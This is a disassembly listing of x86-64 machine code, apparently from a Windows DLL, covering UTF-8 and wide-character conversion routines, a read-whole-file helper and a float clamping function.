   1800034f6:	8b 44 24 70          	mov    0x70(%rsp),%eax
   1800034fa:	85 c0                	test   %eax,%eax
   1800034fc:	74 0e                	je     0x18000350c
   1800034fe:	3d ff ff 00 00       	cmp    $0xffff,%eax
   180003503:	77 02                	ja     0x180003507
   180003505:	ff c7                	inc    %edi
   180003507:	44 38 33             	cmp    %r14b,(%rbx)
   18000350a:	75 d4                	jne    0x1800034e0
   18000350c:	44 8d 6f 01          	lea    0x1(%rdi),%r13d
   180003510:	44 89 6c 24 78       	mov    %r13d,0x78(%rsp)
   180003515:	48 8b dd             	mov    %rbp,%rbx
   180003518:	41 8b fe             	mov    %r14d,%edi
   18000351b:	40 38 7d 00          	cmp    %dil,0x0(%rbp)
   18000351f:	74 3b                	je     0x18000355c
   180003521:	0f 1f 40 00          	nopl   0x0(%rax)
   180003525:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   18000352c:	00 00 00 00 
   180003530:	45 33 c0             	xor    %r8d,%r8d
   180003533:	48 8b d3             	mov    %rbx,%rdx
   180003536:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   18000353b:	e8 30 03 00 00       	call   0x180003870
   180003540:	48 63 c8             	movslq %eax,%rcx
   180003543:	48 03 d9             	add    %rcx,%rbx
   180003546:	8b 44 24 70          	mov    0x70(%rsp),%eax
   18000354a:	85 c0                	test   %eax,%eax
   18000354c:	74 0e                	je     0x18000355c
   18000354e:	3d ff ff 00 00       	cmp    $0xffff,%eax
   180003553:	77 02                	ja     0x180003557
   180003555:	ff c7                	inc    %edi
   180003557:	44 38 33             	cmp    %r14b,(%rbx)
   18000355a:	75 d4                	jne    0x180003530
   18000355c:	44 8d 67 01          	lea    0x1(%rdi),%r12d
   180003560:	4d 8b fe             	mov    %r14,%r15
   180003563:	47 8d 34 2c          	lea    (%r12,%r13,1),%r14d
   180003567:	45 85 f6             	test   %r14d,%r14d
   18000356a:	7e 38                	jle    0x1800035a4
   18000356c:	41 8b ce             	mov    %r14d,%ecx
   18000356f:	b8 08 00 00 00       	mov    $0x8,%eax
   180003574:	44 3b f0             	cmp    %eax,%r14d
   180003577:	0f 4c c8             	cmovl  %eax,%ecx
   18000357a:	85 c9                	test   %ecx,%ecx
   18000357c:	7e 21                	jle    0x18000359f
   18000357e:	48 8b 05 4b 98 07 00 	mov    0x7984b(%rip),%rax        # 0x18007cdd0
   180003585:	48 85 c0             	test   %rax,%rax
   180003588:	74 06                	je     0x180003590
   18000358a:	ff 80 bc 03 00 00    	incl   0x3bc(%rax)
   180003590:	48 63 c9             	movslq %ecx,%rcx
   180003593:	48 03 c9             	add    %rcx,%rcx
   180003596:	ff 15 34 de 03 00    	call   *0x3de34(%rip)        # 0x1800413d0
   18000359c:	4c 8b f8             	mov    %rax,%r15
   18000359f:	45 85 f6             	test   %r14d,%r14d
   1800035a2:	7f 1a                	jg     0x1800035be
   1800035a4:	41 b8 f8 04 00 00    	mov    $0x4f8,%r8d
   1800035aa:	48 8d 15 9f e1 03 00 	lea    0x3e19f(%rip),%rdx        # 0x180041750
   1800035b1:	48 8d 0d a0 0d 04 00 	lea    0x40da0(%rip),%rcx        # 0x180044358
   1800035b8:	ff 15 d2 de 03 00    	call   *0x3ded2(%rip)        # 0x180041490
   1800035be:	49 8b df             	mov    %r15,%rbx
   1800035c1:	49 63 c5             	movslq %r13d,%rax
   1800035c4:	4d 8d 2c 47          	lea    (%r15,%rax,2),%r13
   1800035c8:	49 8d 7d fe          	lea    -0x2(%r13),%rdi
   1800035cc:	4c 3b ff             	cmp    %rdi,%r15
   1800035cf:	73 36                	jae    0x180003607
   1800035d1:	80 3e 00             	cmpb   $0x0,(%rsi)
   1800035d4:	74 31                	je     0x180003607
   1800035d6:	45 33 c0             	xor    %r8d,%r8d
   1800035d9:	48 8b d6             	mov    %rsi,%rdx
   1800035dc:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1800035e1:	e8 8a 02 00 00       	call   0x180003870
   1800035e6:	48 63 c8             	movslq %eax,%rcx
   1800035e9:	48 03 f1             	add    %rcx,%rsi
   1800035ec:	8b 44 24 70          	mov    0x70(%rsp),%eax
   1800035f0:	85 c0                	test   %eax,%eax
   1800035f2:	74 13                	je     0x180003607
   1800035f4:	3d ff ff 00 00       	cmp    $0xffff,%eax
   1800035f9:	77 07                	ja     0x180003602
   1800035fb:	66 89 03             	mov    %ax,(%rbx)
   1800035fe:	48 83 c3 02          	add    $0x2,%rbx
   180003602:	48 3b df             	cmp    %rdi,%rbx
   180003605:	72 ca                	jb     0x1800035d1
   180003607:	33 c0                	xor    %eax,%eax
   180003609:	66 89 03             	mov    %ax,(%rbx)
   18000360c:	8b 74 24 78          	mov    0x78(%rsp),%esi
   180003610:	41 3b f6             	cmp    %r14d,%esi
   180003613:	7c 1a                	jl     0x18000362f
   180003615:	41 b8 f8 04 00 00    	mov    $0x4f8,%r8d
   18000361b:	48 8d 15 2e e1 03 00 	lea    0x3e12e(%rip),%rdx        # 0x180041750
   180003622:	48 8d 0d 2f 0d 04 00 	lea    0x40d2f(%rip),%rcx        # 0x180044358
   180003629:	ff 15 61 de 03 00    	call   *0x3de61(%rip)        # 0x180041490
   18000362f:	49 8b dd             	mov    %r13,%rbx
   180003632:	49 63 c4             	movslq %r12d,%rax
   180003635:	48 8d 3c 45 fe ff ff 	lea    -0x2(,%rax,2),%rdi
   18000363c:	ff 
   18000363d:	49 03 fd             	add    %r13,%rdi
   180003640:	4c 3b ef             	cmp    %rdi,%r13
   180003643:	73 37                	jae    0x18000367c
   180003645:	80 7d 00 00          	cmpb   $0x0,0x0(%rbp)
   180003649:	74 31                	je     0x18000367c
   18000364b:	45 33 c0             	xor    %r8d,%r8d
   18000364e:	48 8b d5             	mov    %rbp,%rdx
   180003651:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180003656:	e8 15 02 00 00       	call   0x180003870
   18000365b:	48 63 c8             	movslq %eax,%rcx
   18000365e:	48 03 e9             	add    %rcx,%rbp
   180003661:	8b 44 24 70          	mov    0x70(%rsp),%eax
   180003665:	85 c0                	test   %eax,%eax
   180003667:	74 13                	je     0x18000367c
   180003669:	3d ff ff 00 00       	cmp    $0xffff,%eax
   18000366e:	77 07                	ja     0x180003677
   180003670:	66 89 03             	mov    %ax,(%rbx)
   180003673:	48 83 c3 02          	add    $0x2,%rbx
   180003677:	48 3b df             	cmp    %rdi,%rbx
   18000367a:	72 c9                	jb     0x180003645
   18000367c:	33 c0                	xor    %eax,%eax
   18000367e:	66 89 03             	mov    %ax,(%rbx)
   180003681:	41 3b f6             	cmp    %r14d,%esi
   180003684:	7c 1a                	jl     0x1800036a0
   180003686:	41 b8 f8 04 00 00    	mov    $0x4f8,%r8d
   18000368c:	48 8d 15 bd e0 03 00 	lea    0x3e0bd(%rip),%rdx        # 0x180041750
   180003693:	48 8d 0d be 0c 04 00 	lea    0x40cbe(%rip),%rcx        # 0x180044358
   18000369a:	ff 15 f0 dd 03 00    	call   *0x3ddf0(%rip)        # 0x180041490
   1800036a0:	45 85 f6             	test   %r14d,%r14d
   1800036a3:	7f 1a                	jg     0x1800036bf
   1800036a5:	41 b8 f8 04 00 00    	mov    $0x4f8,%r8d
   1800036ab:	48 8d 15 9e e0 03 00 	lea    0x3e09e(%rip),%rdx        # 0x180041750
   1800036b2:	48 8d 0d 9f 0c 04 00 	lea    0x40c9f(%rip),%rcx        # 0x180044358
   1800036b9:	ff 15 d1 dd 03 00    	call   *0x3ddd1(%rip)        # 0x180041490
   1800036bf:	49 8b d5             	mov    %r13,%rdx
   1800036c2:	49 8b cf             	mov    %r15,%rcx
   1800036c5:	ff 15 2d de 03 00    	call   *0x3de2d(%rip)        # 0x1800414f8
   1800036cb:	48 8b d8             	mov    %rax,%rbx
   1800036ce:	4d 85 ff             	test   %r15,%r15
   1800036d1:	74 21                	je     0x1800036f4
   1800036d3:	48 8b 0d f6 96 07 00 	mov    0x796f6(%rip),%rcx        # 0x18007cdd0
   1800036da:	48 85 c9             	test   %rcx,%rcx
   1800036dd:	74 06                	je     0x1800036e5
   1800036df:	ff 89 bc 03 00 00    	decl   0x3bc(%rcx)
   1800036e5:	49 8b cf             	mov    %r15,%rcx
   1800036e8:	ff 15 ea dc 03 00    	call   *0x3dcea(%rip)        # 0x1800413d8
   1800036ee:	90                   	nop
   1800036ef:	48 8b c3             	mov    %rbx,%rax
   1800036f2:	eb 00                	jmp    0x1800036f4
   1800036f4:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1800036fb:	00 
   1800036fc:	48 83 c4 30          	add    $0x30,%rsp
   180003700:	41 5f                	pop    %r15
   180003702:	41 5e                	pop    %r14
   180003704:	41 5d                	pop    %r13
   180003706:	41 5c                	pop    %r12
   180003708:	5f                   	pop    %rdi
   180003709:	5e                   	pop    %rsi
   18000370a:	5d                   	pop    %rbp
   18000370b:	c3                   	ret
   18000370c:	cc                   	int3
   18000370d:	cc                   	int3
   18000370e:	cc                   	int3
   18000370f:	cc                   	int3
   180003710:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180003715:	56                   	push   %rsi
   180003716:	48 83 ec 20          	sub    $0x20,%rsp
   18000371a:	49 8b f0             	mov    %r8,%rsi
   18000371d:	48 8b d9             	mov    %rcx,%rbx
   180003720:	48 85 c9             	test   %rcx,%rcx
   180003723:	75 1a                	jne    0x18000373f
   180003725:	41 b8 99 05 00 00    	mov    $0x599,%r8d
   18000372b:	48 8d 15 ce e1 03 00 	lea    0x3e1ce(%rip),%rdx        # 0x180041900
   180003732:	48 8d 0d 37 e2 03 00 	lea    0x3e237(%rip),%rcx        # 0x180041970
   180003739:	ff 15 51 dd 03 00    	call   *0x3dd51(%rip)        # 0x180041490
   18000373f:	48 85 f6             	test   %rsi,%rsi
   180003742:	74 07                	je     0x18000374b
   180003744:	48 c7 06 00 00 00 00 	movq   $0x0,(%rsi)
   18000374b:	48 8d 15 ce 0a 04 00 	lea    0x40ace(%rip),%rdx        # 0x180044220
   180003752:	48 8b cb             	mov    %rbx,%rcx
   180003755:	e8 56 fd ff ff       	call   0x1800034b0
   18000375a:	48 8b d8             	mov    %rax,%rbx
   18000375d:	48 85 c0             	test   %rax,%rax
   180003760:	75 0b                	jne    0x18000376d
   180003762:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180003767:	48 83 c4 20          	add    $0x20,%rsp
   18000376b:	5e                   	pop    %rsi
   18000376c:	c3                   	ret
   18000376d:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   180003772:	48 8b cb             	mov    %rbx,%rcx
   180003775:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   18000377a:	ff 15 80 dd 03 00    	call   *0x3dd80(%rip)        # 0x180041500
   180003780:	8b e8                	mov    %eax,%ebp
   180003782:	83 f8 ff             	cmp    $0xffffffff,%eax
   180003785:	0f 84 bb 00 00 00    	je     0x180003846
   18000378b:	33 d2                	xor    %edx,%edx
   18000378d:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   180003793:	48 8b cb             	mov    %rbx,%rcx
   180003796:	ff 15 3c dd 03 00    	call   *0x3dd3c(%rip)        # 0x1800414d8
   18000379c:	85 c0                	test   %eax,%eax
   18000379e:	0f 85 a2 00 00 00    	jne    0x180003846
   1800037a4:	48 8b cb             	mov    %rbx,%rcx
   1800037a7:	ff 15 53 dd 03 00    	call   *0x3dd53(%rip)        # 0x180041500
   1800037ad:	48 63 f8             	movslq %eax,%rdi
   1800037b0:	83 ff ff             	cmp    $0xffffffff,%edi
   1800037b3:	0f 84 8d 00 00 00    	je     0x180003846
   1800037b9:	45 33 c0             	xor    %r8d,%r8d
   1800037bc:	8b d5                	mov    %ebp,%edx
   1800037be:	48 8b cb             	mov    %rbx,%rcx
   1800037c1:	ff 15 11 dd 03 00    	call   *0x3dd11(%rip)        # 0x1800414d8
   1800037c7:	85 c0                	test   %eax,%eax
   1800037c9:	75 7b                	jne    0x180003846
   1800037cb:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   1800037cf:	74 75                	je     0x180003846
   1800037d1:	48 8b 05 f8 95 07 00 	mov    0x795f8(%rip),%rax        # 0x18007cdd0
   1800037d8:	48 85 c0             	test   %rax,%rax
   1800037db:	74 06                	je     0x1800037e3
   1800037dd:	ff 80 bc 03 00 00    	incl   0x3bc(%rax)
   1800037e3:	48 8b cf             	mov    %rdi,%rcx
   1800037e6:	ff 15 e4 db 03 00    	call   *0x3dbe4(%rip)        # 0x1800413d0
   1800037ec:	48 8b e8             	mov    %rax,%rbp
   1800037ef:	48 85 c0             	test   %rax,%rax
   1800037f2:	74 52                	je     0x180003846
   1800037f4:	4c 8b cb             	mov    %rbx,%r9
   1800037f7:	4c 8b c7             	mov    %rdi,%r8
   1800037fa:	ba 01 00 00 00       	mov    $0x1,%edx
   1800037ff:	48 8b c8             	mov    %rax,%rcx
   180003802:	ff 15 00 dd 03 00    	call   *0x3dd00(%rip)        # 0x180041508
   180003808:	48 8b cb             	mov    %rbx,%rcx
   18000380b:	48 3b c7             	cmp    %rdi,%rax
   18000380e:	74 23                	je     0x180003833
   180003810:	ff 15 ca dc 03 00    	call   *0x3dcca(%rip)        # 0x1800414e0
   180003816:	48 8b 05 b3 95 07 00 	mov    0x795b3(%rip),%rax        # 0x18007cdd0
   18000381d:	48 85 c0             	test   %rax,%rax
   180003820:	74 06                	je     0x180003828
   180003822:	ff 88 bc 03 00 00    	decl   0x3bc(%rax)
   180003828:	48 8b cd             	mov    %rbp,%rcx
   18000382b:	ff 15 a7 db 03 00    	call   *0x3dba7(%rip)        # 0x1800413d8
   180003831:	eb 1c                	jmp    0x18000384f
   180003833:	ff 15 a7 dc 03 00    	call   *0x3dca7(%rip)        # 0x1800414e0
   180003839:	48 85 f6             	test   %rsi,%rsi
   18000383c:	74 03                	je     0x180003841
   18000383e:	48 89 3e             	mov    %rdi,(%rsi)
   180003841:	48 8b c5             	mov    %rbp,%rax
   180003844:	eb 0b                	jmp    0x180003851
   180003846:	48 8b cb             	mov    %rbx,%rcx
   180003849:	ff 15 91 dc 03 00    	call   *0x3dc91(%rip)        # 0x1800414e0
   18000384f:	33 c0                	xor    %eax,%eax
   180003851:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   180003856:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   18000385b:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180003860:	48 83 c4 20          	add    $0x20,%rsp
   180003864:	5e                   	pop    %rsi
   180003865:	c3                   	ret
   180003866:	cc                   	int3
   180003867:	cc                   	int3
   180003868:	cc                   	int3
   180003869:	cc                   	int3
   18000386a:	cc                   	int3
   18000386b:	cc                   	int3
   18000386c:	cc                   	int3
   18000386d:	cc                   	int3
   18000386e:	cc                   	int3
   18000386f:	cc                   	int3
   180003870:	44 0f b6 0a          	movzbl (%rdx),%r9d
   180003874:	45 84 c9             	test   %r9b,%r9b
   180003877:	78 0c                	js     0x180003885
   180003879:	41 0f b6 c1          	movzbl %r9b,%eax
   18000387d:	89 01                	mov    %eax,(%rcx)
   18000387f:	b8 01 00 00 00       	mov    $0x1,%eax
   180003884:	c3                   	ret
   180003885:	41 0f b6 c1          	movzbl %r9b,%eax
   180003889:	24 e0                	and    $0xe0,%al
   18000388b:	3c c0                	cmp    $0xc0,%al
   18000388d:	75 41                	jne    0x1800038d0
   18000388f:	c7 01 fd ff 00 00    	movl   $0xfffd,(%rcx)
   180003895:	4d 85 c0             	test   %r8,%r8
   180003898:	74 09                	je     0x1800038a3
   18000389a:	4c 2b c2             	sub    %rdx,%r8
   18000389d:	49 83 f8 02          	cmp    $0x2,%r8
   1800038a1:	7c dc                	jl     0x18000387f
   1800038a3:	41 80 f9 c2          	cmp    $0xc2,%r9b
   1800038a7:	72 21                	jb     0x1800038ca
   1800038a9:	44 0f b6 42 01       	movzbl 0x1(%rdx),%r8d
   1800038ae:	41 0f b6 c0          	movzbl %r8b,%eax
   1800038b2:	24 c0                	and    $0xc0,%al
   1800038b4:	3c 80                	cmp    $0x80,%al
   1800038b6:	75 12                	jne    0x1800038ca
   1800038b8:	41 83 e1 1f          	and    $0x1f,%r9d
   1800038bc:	41 83 e0 3f          	and    $0x3f,%r8d
   1800038c0:	41 c1 e1 06          	shl    $0x6,%r9d
   1800038c4:	45 03 c8             	add    %r8d,%r9d
   1800038c7:	44 89 09             	mov    %r9d,(%rcx)
   1800038ca:	b8 02 00 00 00       	mov    $0x2,%eax
   1800038cf:	c3                   	ret
   1800038d0:	41 0f b6 c1          	movzbl %r9b,%eax
   1800038d4:	24 f0                	and    $0xf0,%al
   1800038d6:	3c e0                	cmp    $0xe0,%al
   1800038d8:	75 75                	jne    0x18000394f
   1800038da:	c7 01 fd ff 00 00    	movl   $0xfffd,(%rcx)
   1800038e0:	4d 85 c0             	test   %r8,%r8
   1800038e3:	74 09                	je     0x1800038ee
   1800038e5:	4c 2b c2             	sub    %rdx,%r8
   1800038e8:	49 83 f8 03          	cmp    $0x3,%r8
   1800038ec:	7c 91                	jl     0x18000387f
   1800038ee:	41 80 f9 e0          	cmp    $0xe0,%r9b
   1800038f2:	75 0a                	jne    0x1800038fe
   1800038f4:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   1800038f8:	04 60                	add    $0x60,%al
   1800038fa:	3c 1f                	cmp    $0x1f,%al
   1800038fc:	eb 0a                	jmp    0x180003908
   1800038fe:	41 80 f9 ed          	cmp    $0xed,%r9b
   180003902:	75 06                	jne    0x18000390a
   180003904:	80 7a 01 9f          	cmpb   $0x9f,0x1(%rdx)
   180003908:	77 3f                	ja     0x180003949
   18000390a:	44 0f b6 42 01       	movzbl 0x1(%rdx),%r8d
   18000390f:	41 0f b6 c0          	movzbl %r8b,%eax
   180003913:	45 0f b6 d1          	movzbl %r9b,%r10d
   180003917:	24 c0                	and    $0xc0,%al
   180003919:	3c 80                	cmp    $0x80,%al
   18000391b:	75 2c                	jne    0x180003949
   18000391d:	44 0f b6 4a 02       	movzbl 0x2(%rdx),%r9d
   180003922:	41 0f b6 c1          	movzbl %r9b,%eax
   180003926:	24 c0                	and    $0xc0,%al
   180003928:	3c 80                	cmp    $0x80,%al
   18000392a:	75 1d                	jne    0x180003949
   18000392c:	41 83 e0 3f          	and    $0x3f,%r8d
   180003930:	41 83 e2 0f          	and    $0xf,%r10d
   180003934:	41 c1 e0 06          	shl    $0x6,%r8d
   180003938:	41 83 e1 3f          	and    $0x3f,%r9d
   18000393c:	41 c1 e2 0c          	shl    $0xc,%r10d
   180003940:	45 03 c2             	add    %r10d,%r8d
   180003943:	45 03 c1             	add    %r9d,%r8d
   180003946:	44 89 01             	mov    %r8d,(%rcx)
   180003949:	b8 03 00 00 00       	mov    $0x3,%eax
   18000394e:	c3                   	ret
   18000394f:	41 0f b6 c1          	movzbl %r9b,%eax
   180003953:	24 f8                	and    $0xf8,%al
   180003955:	3c f0                	cmp    $0xf0,%al
   180003957:	0f 85 a9 00 00 00    	jne    0x180003a06
   18000395d:	c7 01 fd ff 00 00    	movl   $0xfffd,(%rcx)
   180003963:	4d 85 c0             	test   %r8,%r8
   180003966:	74 0d                	je     0x180003975
   180003968:	4c 2b c2             	sub    %rdx,%r8
   18000396b:	49 83 f8 04          	cmp    $0x4,%r8
   18000396f:	0f 8c 0a ff ff ff    	jl     0x18000387f
   180003975:	41 80 f9 f4          	cmp    $0xf4,%r9b
   180003979:	0f 87 81 00 00 00    	ja     0x180003a00
   18000397f:	41 80 f9 f0          	cmp    $0xf0,%r9b
   180003983:	75 0c                	jne    0x180003991
   180003985:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   180003989:	3c 90                	cmp    $0x90,%al
   18000398b:	72 73                	jb     0x180003a00
   18000398d:	3c bf                	cmp    $0xbf,%al
   18000398f:	eb 0a                	jmp    0x18000399b
   180003991:	41 80 f9 f4          	cmp    $0xf4,%r9b
   180003995:	75 06                	jne    0x18000399d
   180003997:	80 7a 01 8f          	cmpb   $0x8f,0x1(%rdx)
   18000399b:	77 63                	ja     0x180003a00
   18000399d:	44 0f b6 42 01       	movzbl 0x1(%rdx),%r8d
   1800039a2:	41 0f b6 c0          	movzbl %r8b,%eax
   1800039a6:	24 c0                	and    $0xc0,%al
   1800039a8:	3c 80                	cmp    $0x80,%al
   1800039aa:	75 54                	jne    0x180003a00
   1800039ac:	44 0f b6 52 02       	movzbl 0x2(%rdx),%r10d
   1800039b1:	41 0f b6 c2          	movzbl %r10b,%eax
   1800039b5:	24 c0                	and    $0xc0,%al
   1800039b7:	3c 80                	cmp    $0x80,%al
   1800039b9:	75 45                	jne    0x180003a00
   1800039bb:	44 0f b6 5a 03       	movzbl 0x3(%rdx),%r11d
   1800039c0:	41 0f b6 c3          	movzbl %r11b,%eax
   1800039c4:	24 c0                	and    $0xc0,%al
   1800039c6:	3c 80                	cmp    $0x80,%al
   1800039c8:	75 36                	jne    0x180003a00
   1800039ca:	41 83 e1 07          	and    $0x7,%r9d
   1800039ce:	41 83 e0 3f          	and    $0x3f,%r8d
   1800039d2:	41 c1 e1 12          	shl    $0x12,%r9d
   1800039d6:	41 83 e2 3f          	and    $0x3f,%r10d
   1800039da:	41 c1 e0 0c          	shl    $0xc,%r8d
   1800039de:	41 83 e3 3f          	and    $0x3f,%r11d
   1800039e2:	41 c1 e2 06          	shl    $0x6,%r10d
   1800039e6:	43 8d 14 08          	lea    (%r8,%r9,1),%edx
   1800039ea:	41 03 d2             	add    %r10d,%edx
   1800039ed:	41 03 d3             	add    %r11d,%edx
   1800039f0:	8b c2                	mov    %edx,%eax
   1800039f2:	25 00 f8 ff ff       	and    $0xfffff800,%eax
   1800039f7:	3d 00 d8 00 00       	cmp    $0xd800,%eax
   1800039fc:	74 02                	je     0x180003a00
   1800039fe:	89 11                	mov    %edx,(%rcx)
   180003a00:	b8 04 00 00 00       	mov    $0x4,%eax
   180003a05:	c3                   	ret
   180003a06:	c7 01 00 00 00 00    	movl   $0x0,(%rcx)
   180003a0c:	33 c0                	xor    %eax,%eax
   180003a0e:	c3                   	ret
   180003a0f:	cc                   	int3
   180003a10:	40 53                	rex push %rbx
   180003a12:	57                   	push   %rdi
   180003a13:	48 83 ec 08          	sub    $0x8,%rsp
   180003a17:	4c 63 da             	movslq %edx,%r11
   180003a1a:	48 8b d9             	mov    %rcx,%rbx
   180003a1d:	4c 03 d9             	add    %rcx,%r11
   180003a20:	4c 8b d1             	mov    %rcx,%r10
   180003a23:	49 8d 7b ff          	lea    -0x1(%r11),%rdi
   180003a27:	48 3b cf             	cmp    %rdi,%rcx
   180003a2a:	0f 83 47 01 00 00    	jae    0x180003b77
   180003a30:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   180003a35:	bd 80 00 00 00       	mov    $0x80,%ebp
   180003a3a:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   180003a3f:	be ff 03 00 00       	mov    $0x3ff,%esi
   180003a44:	4c 89 64 24 30       	mov    %r12,0x30(%rsp)
   180003a49:	41 bc 00 28 00 00    	mov    $0x2800,%r12d
   180003a4f:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   180003a54:	41 be 00 08 00 00    	mov    $0x800,%r14d
   180003a5a:	4c 89 3c 24          	mov    %r15,(%rsp)
   180003a5e:	41 bf 00 24 00 00    	mov    $0x2400,%r15d
   180003a64:	4d 85 c9             	test   %r9,%r9
   180003a67:	74 09                	je     0x180003a72
   180003a69:	4d 3b c1             	cmp    %r9,%r8
   180003a6c:	0f 83 ed 00 00 00    	jae    0x180003b5f
   180003a72:	41 0f b7 00          	movzwl (%r8),%eax
   180003a76:	66 85 c0             	test   %ax,%ax
   180003a79:	0f 84 e0 00 00 00    	je     0x180003b5f
   180003a7f:	49 83 c0 02          	add    $0x2,%r8
   180003a83:	66 3b c5             	cmp    %bp,%ax
   180003a86:	73 0d                	jae    0x180003a95
   180003a88:	41 88 02             	mov    %al,(%r10)
   180003a8b:	b8 01 00 00 00       	mov    $0x1,%eax
   180003a90:	e9 be 00 00 00       	jmp    0x180003b53
   180003a95:	41 8b d3             	mov    %r11d,%edx
   180003a98:	41 2b d2             	sub    %r10d,%edx
   180003a9b:	ff ca                	dec    %edx
   180003a9d:	66 41 3b c6          	cmp    %r14w,%ax
   180003aa1:	73 2b                	jae    0x180003ace
   180003aa3:	83 fa 02             	cmp    $0x2,%edx
   180003aa6:	7d 07                	jge    0x180003aaf
   180003aa8:	33 c0                	xor    %eax,%eax
   180003aaa:	e9 a4 00 00 00       	jmp    0x180003b53
   180003aaf:	0f b7 c8             	movzwl %ax,%ecx
   180003ab2:	24 3f                	and    $0x3f,%al
   180003ab4:	66 c1 e9 06          	shr    $0x6,%cx
   180003ab8:	80 e9 40             	sub    $0x40,%cl
   180003abb:	04 80                	add    $0x80,%al
   180003abd:	41 88 0a             	mov    %cl,(%r10)
   180003ac0:	41 88 42 01          	mov    %al,0x1(%r10)
   180003ac4:	b8 02 00 00 00       	mov    $0x2,%eax
   180003ac9:	e9 85 00 00 00       	jmp    0x180003b53
   180003ace:	41 8d 0c 07          	lea    (%r15,%rax,1),%ecx
   180003ad2:	66 3b ce             	cmp    %si,%cx
   180003ad5:	77 04                	ja     0x180003adb
   180003ad7:	33 c0                	xor    %eax,%eax
   180003ad9:	eb 78                	jmp    0x180003b53
   180003adb:	41 8d 0c 04          	lea    (%r12,%rax,1),%ecx
   180003adf:	66 3b ce             	cmp    %si,%cx
   180003ae2:	77 3b                	ja     0x180003b1f
   180003ae4:	83 fa 04             	cmp    $0x4,%edx
   180003ae7:	7d 04                	jge    0x180003aed
   180003ae9:	33 c0                	xor    %eax,%eax
   180003aeb:	eb 66                	jmp    0x180003b53
   180003aed:	0f b7 c8             	movzwl %ax,%ecx
   180003af0:	41 c6 02 f0          	movb   $0xf0,(%r10)
   180003af4:	66 c1 e9 0c          	shr    $0xc,%cx
   180003af8:	80 c1 80             	add    $0x80,%cl
   180003afb:	41 88 4a 01          	mov    %cl,0x1(%r10)
   180003aff:	0f b7 c8             	movzwl %ax,%ecx
   180003b02:	66 c1 e9 06          	shr    $0x6,%cx
   180003b06:	24 3f                	and    $0x3f,%al
   180003b08:	80 e1 3f             	and    $0x3f,%cl
   180003b0b:	80 c1 80             	add    $0x80,%cl
   180003b0e:	04 80                	add    $0x80,%al
   180003b10:	41 88 4a 02          	mov    %cl,0x2(%r10)
   180003b14:	41 88 42 03          	mov    %al,0x3(%r10)
   180003b18:	b8 04 00 00 00       	mov    $0x4,%eax
   180003b1d:	eb 34                	jmp    0x180003b53
   180003b1f:	83 fa 03             	cmp    $0x3,%edx
   180003b22:	7d 04                	jge    0x180003b28
   180003b24:	33 c0                	xor    %eax,%eax
   180003b26:	eb 2b                	jmp    0x180003b53
   180003b28:	0f b7 c8             	movzwl %ax,%ecx
   180003b2b:	66 c1 e9 0c          	shr    $0xc,%cx
   180003b2f:	80 e9 20             	sub    $0x20,%cl
   180003b32:	41 88 0a             	mov    %cl,(%r10)
   180003b35:	0f b7 c8             	movzwl %ax,%ecx
   180003b38:	66 c1 e9 06          	shr    $0x6,%cx
   180003b3c:	24 3f                	and    $0x3f,%al
   180003b3e:	80 e1 3f             	and    $0x3f,%cl
   180003b41:	80 c1 80             	add    $0x80,%cl
   180003b44:	04 80                	add    $0x80,%al
   180003b46:	41 88 4a 01          	mov    %cl,0x1(%r10)
   180003b4a:	41 88 42 02          	mov    %al,0x2(%r10)
   180003b4e:	b8 03 00 00 00       	mov    $0x3,%eax
   180003b53:	4c 03 d0             	add    %rax,%r10
   180003b56:	4c 3b d7             	cmp    %rdi,%r10
   180003b59:	0f 82 05 ff ff ff    	jb     0x180003a64
   180003b5f:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   180003b64:	4c 8b 64 24 30       	mov    0x30(%rsp),%r12
   180003b69:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   180003b6e:	48 8b 6c 24 20       	mov    0x20(%rsp),%rbp
   180003b73:	4c 8b 3c 24          	mov    (%rsp),%r15
   180003b77:	41 c6 02 00          	movb   $0x0,(%r10)
   180003b7b:	44 2b d3             	sub    %ebx,%r10d
   180003b7e:	41 8b c2             	mov    %r10d,%eax
   180003b81:	48 83 c4 08          	add    $0x8,%rsp
   180003b85:	5f                   	pop    %rdi
   180003b86:	5b                   	pop    %rbx
   180003b87:	c3                   	ret
   180003b88:	cc                   	int3
   180003b89:	cc                   	int3
   180003b8a:	cc                   	int3
   180003b8b:	cc                   	int3
   180003b8c:	cc                   	int3
   180003b8d:	cc                   	int3
   180003b8e:	cc                   	int3
   180003b8f:	cc                   	int3
   180003b90:	f3 0f 10 11          	movss  (%rcx),%xmm2
   180003b94:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003b97:	0f 2f c2             	comiss %xmm2,%xmm0
   180003b9a:	f3 0f 10 1d 62 7f 04 	movss  0x47f62(%rip),%xmm3        # 0x18004bb04
   180003ba1:	00 
   180003ba2:	76 05                	jbe    0x180003ba9
   180003ba4:	0f 57 c9             	xorps  %xmm1,%xmm1
   180003ba7:	eb 07                	jmp    0x180003bb0
   180003ba9:	0f 28 cb             	movaps %xmm3,%xmm1
   180003bac:	f3 0f 5d ca          	minss  %xmm2,%xmm1
   180003bb0:	f3 0f 10 61 04       	movss  0x4(%rcx),%xmm4
   180003bb5:	0f 2f c4             	comiss %xmm4,%xmm0
   180003bb8:	76 05                	jbe    0x180003bbf
   180003bba:	0f 57 d2             	xorps  %xmm2,%xmm2
   180003bbd:	eb 07                	jmp    0x180003bc6
   180003bbf:	0f 28 d3             	movaps %xmm3,%xmm2
   180003bc2:	f3 0f 5d d4          	minss  %xmm4,%xmm2
